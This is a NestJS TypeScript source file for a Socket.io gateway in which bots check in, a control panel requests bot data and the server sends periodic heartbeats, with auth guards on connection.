import { WebSocketGateway, SubscribeMessage, MessageBody, OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect, WebSocketServer, ConnectedSocket } from '@nestjs/websockets';
import { PattayaMessagesService } from './pattaya-messages.service';
import { Logger, UseGuards } from '@nestjs/common';
import { Server, Socket } from 'socket.io';
import { BotCheckinDto } from './dto/bot-checkin.dto';
import { ResponseMessageDto } from './dto/response-message.dto';
import { PanelAuthGuard } from './guard/panel-auth.guard';
import { ConfigService } from '@nestjs/config';
import { BotAuthGuard } from './guard/bot-auth.guard';


@WebSocketGateway({ 
  namespace: '/',
  cors: {
    origin: '*'
  },
})
export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect {

  private readonly logger = new Logger(PattayaMessagesGateway.name);


  

  @WebSocketServer()
  server: Server;

  constructor(
    private readonly pattayaMessagesService: PattayaMessagesService,
    private readonly panelGuard: PanelAuthGuard,
    private readonly botGuard: BotAuthGuard,  
    private readonly configService: ConfigService
    )  {}

  afterInit(server: Server) {
    this.logger.log('Socket.io server initialized');
    setInterval(async () => {
      const response: ResponseMessageDto = {
        success: true,
        message: 'Greet from server!!!',
      }
      this.server.emit('panel_received_server_heartbeat', response);
      this.logger.log(`Response server heartbeat: ${response.message}`);
    }, this.configService.get<number>('app.server-heartbeat-delay'));
  }

  handleConnection(client: Socket, ...args: any[]) {
    this.logger.log(`Client connected: ${client.id}`);
    if(!this.panelGuard.validateRequest(client) || !this.botGuard.validateRequest(client)){
      const response: ResponseMessageDto = {
        success: false,
        message: 'Fuck off. Go away!!',
      }
      this.server.emit('panel_received_server_heartbeat', response);
      this.server.emit('bot_received_server_heartbeat', response);
      client.disconnect();
    }
  }

  async handleDisconnect(client: Socket) {
    this.logger.log(`Client disconnected: ${client.id}`);
    await this.pattayaMessagesService.botOffline(client.id)
    this.requestBotData({}, client)
  }

  @SubscribeMessage('bot_checkin')
  async botCheckin(@MessageBody() botCheckinDto: BotCheckinDto, @ConnectedSocket() client: Socket){
    botCheckinDto.socketId = client.id;
    this.logger.log(`bot checkin request: ${JSON.stringify(botCheckinDto)}`)
    const result = await this.pattayaMessagesService.botCheckin(botCheckinDto)
    this.requestBotData({}, client)
    if(!result) {
      return <ResponseMessageDto>{
        success: false,
        message: "Cannot checkin"
      }
    }
    return <ResponseMessageDto>{
      success: true,
      message: 'Bot checked-in'
    }
  }

  @UseGuards(PanelAuthGuard)
  @SubscribeMessage('panel_request_bot_data')
  async requestBotData(@MessageBody() request: any, @ConnectedSocket() client: Socket){
    this.logger.log(`panel_request_bot_data called`)
    const data = await this.pattayaMessagesService.getAllBots()
    const response: ResponseMessageDto = {
      success: true,
      message: 'Bot checked-in',
      data
    }
    this.logger.log(`response to panel_request_bot_data called: ${JSON.stringify(response)}`)
    this.server.emit('panel_received_bot_data', response)
  }



}
